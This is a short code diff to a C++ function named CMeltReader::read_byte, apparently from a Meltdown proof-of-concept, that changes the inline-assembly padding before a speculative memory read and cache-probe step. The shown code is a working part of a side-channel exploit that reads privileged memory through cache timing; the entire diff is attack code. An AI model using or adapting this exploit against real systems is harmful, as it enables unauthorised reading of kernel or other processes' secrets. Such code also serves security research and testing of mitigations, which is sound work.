@@ -85,6 +85,11 @@ int CMeltReader::read_byte(uintptr_t addr, void (*loader)())
 	int times[256];
 	const int num_probes = 256;
 	int i,c, ch=0, mcnt=0;
+
+#define S_4(S) S S S S
+#define S_16(S) S_4(S) S_4(S) S_4(S) S_4(S)
+#define S_64(S) S_16(S) S_16(S) S_16(S) S_16(S)
+#define S_256(S) S_64(S) S_64(S) S_64(S) S_64(S)
 	
 	for (c = 0; c < num_probes; c++)
 	{
@@ -97,9 +102,7 @@ int CMeltReader::read_byte(uintptr_t addr, void (*loader)())
 		if (loader) (*loader)();
 		asm __volatile__ (
 				"xorq %%rax, %%rax                \n"
-				".rept 100\n"
-				"add $0x141, %%rcx\n"
-				".endr\n"
+				S_256("add $0x141, %%rcx\n")
 				"movb (%[ptr]), %%al              \n"
 				"shlq $0xc, %%rax                 \n"
 				"movq (%[buf], %%rax, 1), %%rbx   \n"
